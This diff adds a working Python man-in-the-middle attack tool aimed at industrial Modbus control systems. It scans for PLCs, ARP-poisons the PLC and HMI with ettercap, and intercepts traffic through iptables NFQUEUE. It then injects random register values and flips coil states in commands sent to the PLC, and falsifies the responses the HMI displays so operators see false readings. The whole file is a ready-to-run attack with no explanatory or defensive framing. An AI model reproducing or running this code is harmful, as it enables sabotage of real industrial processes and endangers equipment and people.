@@ -1,0 +1,141 @@
+from scapy.all import *
+from netfilterqueue import NetfilterQueue
+import os, nmap
+from scapy.contrib import modbus
+from random import *
+from time import *
+from multiprocessing import Process
+
+plc_ip = ''
+hmi_ip = ''
+
+# plc ip
+def scan():
+        nm = nmap.PortScanner()
+        net = input("enter your network : ")
+        nm.scan(hosts=net, arguments='-n -p502 --script modbus-discover.nse')
+        hosts_list = [(x, nm[x]['tcp'][502]['state']) for x in nm.all_hosts()]
+        for host, state in hosts_list:
+            if state == 'open':
+                global plc_ip
+                plc_ip = host
+                print("PLC IP : {}".format(plc_ip))
+
+# hmi ip
+def psniff(plcip):
+        fil = "dst host {} and dst port 502 and tcp[13] = 0x18".format(plcip)
+        p = sniff(iface="eth0", count=1, filter=fil)
+        x = p[0]
+        global hmi_ip
+        hmi_ip = x[IP].src
+        print("HMI IP : {}".format(hmi_ip))
+
+# get plc & hmi ip
+def get_ip():
+        scan()
+        arp1 = 'nohup ettercap -Tq -i eth0 -M ARP /{}// >/dev/null 2>&1 &'.format(plc_ip)
+        os.system(arp1)
+        psniff(plc_ip)
+        os.system('pkill -f ettercap')
+        sleep(1)
+
+# arp mitm
+def arp_spoofing():
+        arp2 = 'nohup ettercap -Tq -i eth0 -M ARP /{hmi}// /{plc}// >/dev/null 2>&1 &'.format(hmi=hmi_ip, plc=plc_ip)
+        os.system(arp2)
+        process = os.popen('pgrep -f ettercap')
+        out = process.read()
+        process.close()
+        print("ettercap is running, PID : {}".format(out))
+        print("ARP Poisoning start !!")
+        sleep(4)
+
+# modbus query data injection
+def query_pkt(packet):
+    try:
+        z = IP(packet.get_payload())
+        func = z.funcCode
+        del z[TCP].chksum
+        del z[IP].chksum
+        del z[IP].len
+        del z[TCP].len
+        if z[IP].dst == plc_ip:
+            if func == 16:
+                    c = z[TCP].outputsValue
+                    z.outputsValue = randrange(10000, 20000)
+                    print("Register {add}, change {v1} to {v2}".format(add=z.startAddr, v1=c, v2=z.outputsValue))
+            elif func == 5:
+                    if z.outputValue == 65280:
+                           z.outputValue = 0
+                           print("Query Coil {} , change 1 to 0".format(z[TCP].outputAddr))
+                    elif z.outputValue == 0:
+                           z.outputValue = 65280
+                           print("Query Coil {} , change 0 to 1".format(z[TCP].outputAddr))
+        packet.set_payload(bytes(z))
+        packet.accept()
+    except AttributeError:
+        packet.accept()
+
+# modbus response data injection
+def response_pkt(packet):
+        try:
+            z = IP(packet.get_payload())
+            func = z.funcCode
+            del z[TCP].chksum
+            del z[IP].chksum
+            del z[IP].len
+            del z[TCP].len
+            if z[IP].dst == hmi_ip:
+                if func == 16:
+                      print("response Register {}".format(z.startAddr))
+                elif func == 5:
+                      if z.outputValue == 65280:
+                             z.outputValue = 0
+                             print("Response Coil {} , change 1 to 0".format(z.outputAddr))
+                      elif z.outputValue == 0:
+                             z.outputValue = 65280
+                             print("Response Coil {} , change 0 to 1".format(z.outputAddr))
+            packet.set_payload(bytes(z))
+            packet.accept()
+        except AttributeError:
+            packet.accept()
+
+# Capturing packets with NetfilterQueue & iptables 
+def query_injection():
+	QUEUE_NUM = 0
+	os.system("iptables -I OUTPUT -p tcp -d {plc1} -j NFQUEUE --queue-num 0".format(plc1=plc_ip))
+	queue = NetfilterQueue()
+	try:
+    		queue.bind(QUEUE_NUM, query_pkt)
+    		queue.run()
+	except KeyboardInterrupt:
+		os.system("iptables --flush && iptables -t nat -F")
+		print("........Exiting......")
+		sleep(3)
+	queue.unbind()
+
+def response_injection():
+        QUEUE_NUM = 1
+        os.system("iptables -I OUTPUT -p tcp -d {hmi1} -j NFQUEUE --queue-num 1".format(hmi1=hmi_ip))
+        queue = NetfilterQueue()
+        try:
+                queue.bind(QUEUE_NUM, response_pkt)
+                queue.run()
+        except KeyboardInterrupt:
+                os.system("iptables --flush && iptables -t nat -F")
+                print("........Exiting......")
+                sleep(3)
+        queue.unbind()
+
+# main function (multiprocess)
+def main():
+        get_ip()
+        arp_spoofing()
+        p1 = Process(target=query_injection)
+        p2 = Process(target=response_injection)
+        p1.start()
+        p2.start()
+try:
+   main()
+except KeyboardInterrupt:
+   exit()
